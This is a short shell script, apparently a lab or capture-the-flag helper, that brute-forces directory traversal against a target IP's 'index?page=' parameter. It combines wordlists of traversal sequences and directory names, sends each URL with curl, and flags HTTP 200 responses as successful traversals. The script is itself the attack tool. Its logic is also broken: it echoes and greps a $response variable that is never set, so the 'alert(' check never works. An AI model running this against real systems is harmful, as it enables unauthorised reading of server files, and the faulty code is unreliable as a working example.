#!/bin/sh

if [ $# -lt 1 ]; then
    echo "Usage: $0 ip-address"
    exit 1
fi

directory_names='./directories.txt'
paths='./traversal_paths.txt'
target_url="http://$1/index?page="

while IFS= read -r dir; do
	while IFS= read -r path; do
			full_url="${target_url}${path}${dir}"
      echo "Trying: $full_url"

      http_status=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")
			echo $response
      if echo "$response" | grep -iq "alert("; then
            echo "Alert detected on: $full_url"
        else
            http_status=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")
            if [ "$http_status" -eq 200 ]; then
                echo "Successful traversal (no alert detected): $full_url"
            else
                echo "Failed traversal: $full_url (HTTP Status: $http_status)"
            fi
        fi
	done < "$paths"
done < "$directory_names"

